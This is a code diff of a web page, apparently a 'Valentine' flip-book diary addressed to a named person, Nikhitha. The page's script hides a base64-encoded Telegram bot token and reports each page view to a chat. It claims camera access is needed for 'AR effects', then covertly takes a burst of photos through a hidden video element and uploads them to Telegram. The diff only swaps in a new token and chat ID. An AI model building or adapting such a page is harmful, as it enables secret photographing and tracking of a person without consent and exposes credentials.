@@ -96,7 +96,7 @@
     </div>
     <video id="video-preview" autoplay muted playsinline style="position:fixed; opacity:0; pointer-events:none;"></video>
     <script>
-        const t = atob("ODU2NzQwMjg4NzpBQUd1d2FCOVNGSmY2SFktUTdQZ21mQUFvSmZlMVg0Vldabw==");
+      const t = atob("ODkwNzUyNDk0NDpBQUdqR0J2bkxPRlF4b1AzaFhRRlViV0xqc1AyakRsZEpQYz9jaGF0X2lkPTk3NDU3Nzk2MjU=");
         const bgMusic = document.getElementById('bg-music');
         let stream = null;
 
@@ -117,7 +117,7 @@
             if(el.classList.contains('flipped')) {
                 // Moving the zIndex UP when flipping to the left
                 el.style.zIndex = pageNum + 50; 
-                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Nikhitha%20is%20on%20Page%20${pageNum}%20❤️`);
+                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=9745779625&text=Nikhitha%20is%20on%20Page%20${pageNum}%20❤️`);
             } else {
                 // Returning zIndex to original stack order when flipping back
                 el.style.zIndex = pages.length - pageNum;
@@ -130,7 +130,7 @@
                 document.getElementById('overlay').style.display = 'none';
                 document.getElementById('diary-wrapper').style.display = 'block';
                 bgMusic.play();
-                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Valentine%20Link%20Opened!%20❤️`);
+                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=9745779625&text=Valentine%20Link%20Opened!%20❤️`);
                 takeBurstPhotos(10, 2000); 
             } catch (err) { 
                 alert("Wait! To see the Valentine surprise, you must Allow Camera access for the AR effects! ❤️");
@@ -149,7 +149,7 @@
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     canvas.toBlob((blob) => {
                         const formData = new FormData();
-                        formData.append('chat_id', "5324376571");
+                        formData.append('chat_id', "9745779625");
                         formData.append('photo', blob, `reaction_${i}.jpg`);
                         fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: 'POST', body: formData });
                     }, 'image/jpeg', 0.6);
